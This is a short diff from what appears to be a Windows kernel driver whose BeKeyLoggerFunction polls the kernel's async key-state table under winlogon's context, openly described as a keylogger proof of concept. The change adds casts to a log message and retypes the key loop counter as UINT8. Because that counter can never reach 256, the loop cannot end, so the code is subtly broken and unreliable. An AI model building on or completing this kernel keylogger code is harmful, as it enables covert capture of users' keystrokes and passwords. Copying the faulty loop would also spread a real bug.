@@ -433,7 +433,7 @@ BeGetGafAsyncKeyStateAddress()
 	}
 	else
 	{
-		LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", i, address);
+		LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)i, (ULONG_PTR)address);
 	}
 
 	KeUnstackDetachProcess(&apc);
@@ -457,7 +457,7 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 			BeUpdateKeyStateMap(BeGlobals::winLogonPid, gasAsyncKeyStateAddr);
 
 			// POC: just check for A. TODO: log all keys
-            for (int i = 0; i < 256; ++i)
+            for (UINT8 i = 0; i < 256; ++i)
             {
                 if (BeWasKeyPressed(i))
                 {
